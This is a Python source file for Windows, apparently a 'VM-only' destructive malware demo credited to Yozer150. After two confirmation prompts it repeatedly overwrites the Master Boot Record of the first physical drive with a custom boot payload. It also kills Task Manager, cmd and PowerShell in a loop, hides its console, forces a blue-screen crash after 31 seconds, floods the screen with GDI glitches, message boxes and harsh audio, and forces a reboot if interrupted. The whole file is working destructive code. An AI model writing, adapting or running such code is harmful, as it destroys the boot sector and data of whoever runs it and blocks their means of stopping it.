import numpy as np
import sounddevice as sd
import time
import win32gui
import win32con
import win32api
import random
import ctypes
import msvcrt
import sys
import threading
import os

# Created by Yozer150
sample_rate = 44100
intensity = 0.0
user32 = ctypes.windll.user32
ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32

def mbr_spam():
    """Поток бесконечной перезаписи MBR (обгоняет другие вирусы)"""
    # Payload: blinking screen
    mbr_data = bytearray([
        0xB8, 0x12, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0x0A, 0x8E, 0xC0, 
        0x31, 0xDB, 0xB4, 0x0F, 0xCD, 0x10, 0x31, 0xC0, 0x8E, 0xD8, 
        0xBA, 0x00, 0x03, 0xB0, 0x00, 0xEE, 0xB0, 0xFF, 0xEE, 0xEB, 0xF7
    ])
    mbr_full = mbr_data + b'\x00' * (510 - len(mbr_data)) + b'\x55\xAA'
    while True:
        try:
            with open(r"\\.\PhysicalDrive0", "rb+") as f:
                f.write(mbr_full)
                f.flush()
        except:
            pass
        time.sleep(0.001)

def kill_tools():
    """Блокировка Task Manager, CMD и других инструментов"""
    while True:
        os.system("taskkill /f /im taskmgr.exe /im resmon.exe /im taskkill.exe /im mmc.exe /im cmd.exe /im powershell.exe >nul 2>&1")
        time.sleep(0.1)

def trigger_bsod():
    """Вызов BSOD ровно через 31 секунду"""
    time.sleep(31)
    enabled = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
    ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def spawn_msgbox():
    messages = ["Where am I?", "Who are you?", "Something is wrong...", "Stop it.", "YOU ARE NEXT", "I'm dead!!!"]
    msg = random.choice(messages)
    style = random.choice([0,1,2,3,4,5]) | random.choice([0x10, 0x20, 0x30, 0x40]) | 0x40000
    user32.MessageBoxW(0, msg, "FATAL ERROR", style)

def show_warnings():
    MB_YESNO = 0x04
    IDYES = 6
    # Автор Yozer150 только в первом окне
    if user32.MessageBoxW(0, "WARNING: System Impact by Yozer150\nAre you running this inside a VIRTUAL MACHINE?", "WARNING", MB_YESNO | 0x30) != IDYES:
        sys.exit()
    if user32.MessageBoxW(0, "FINAL CONFIRMATION\nDo you want to proceed at your own risk?", "FINAL CONFIRMATION", MB_YESNO | 0x10) != IDYES:
        sys.exit()
    
    # После нажатия "Да" — запускаем деструктивные потоки
    threading.Thread(target=mbr_spam, daemon=True).start()
    threading.Thread(target=kill_tools, daemon=True).start()
    threading.Thread(target=trigger_bsod, daemon=True).start()
    
    # Скрываем консоль, чтобы нельзя было закрыть
    console_hwnd = kernel32.GetConsoleWindow()
    if console_hwnd: user32.ShowWindow(console_hwnd, 0)

def rename_windows(hwnd, lParam):
    if win32gui.IsWindowVisible(hwnd):
        win32gui.SetWindowText(hwnd, "I'm dead?")

def audio_callback(outdata, frames, time_info, status):
    global intensity
    t = (np.arange(frames) + audio_callback.t) / sample_rate
    audio_callback.t += frames
    bass = np.sin(2 * np.pi * 40 * t)
    jackpot = np.sin(2 * np.pi * (800 + 500 * np.sin(5 * t)) * t)
    noise = np.random.uniform(-1, 1, frames)
    intensity += 0.01 
    if intensity > 3.0: intensity = 3.0
    sound = np.tanh((bass * (1 + intensity * 10) + 0.5 * jackpot + 0.3 * noise) * (2 + intensity * 15)) 
    outdata[:] = np.clip(sound, -1, 1).reshape(-1, 1)

audio_callback.t = 0

if __name__ == "__main__":
    show_warnings()
    hdc = win32gui.GetDC(0)
    sw, sh = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    start_time = time.time()

    try:
        with sd.OutputStream(callback=audio_callback, samplerate=sample_rate, channels=1):
            while True:
                win32gui.BitBlt(hdc, random.randint(-20, 20), random.randint(-20, 20), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
                win32gui.EnumWindows(rename_windows, None)

                if time.time() - start_time > 1.0 and random.random() < 0.15:
                    threading.Thread(target=spawn_msgbox, daemon=True).start()

                if intensity > 0.5 and random.random() > 0.85:
                    win32gui.BitBlt(hdc, random.randint(0, sw), 0, random.randint(50, 200), sh, hdc, random.randint(0, sw), 0, win32con.SRCCOPY)
                    
                if intensity > 1.0:
                    if random.random() > 0.94:
                        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, win32con.NOTSRCCOPY)
                    win32gui.BitBlt(hdc, random.randint(-10, 10), 2, sw, sh, hdc, 0, 0, win32con.SRCCOPY)

                if intensity > 2.0:
                    win32gui.StretchBlt(hdc, random.randint(0, 30), random.randint(0, 30), sw - 60, sh - 60, hdc, 0, 0, sw, sh, win32con.SRCCOPY)
                    if random.random() > 0.7:
                        win32gui.PatBlt(hdc, random.randint(0, sw), random.randint(0, sh), random.randint(100, 400), random.randint(100, 400), win32con.DSTINVERT)

                time.sleep(0.01)
    except:
        # Если скрипт попытаются убить, провоцируем немедленное выключение
        os.system("shutdown /r /t 0 /f")
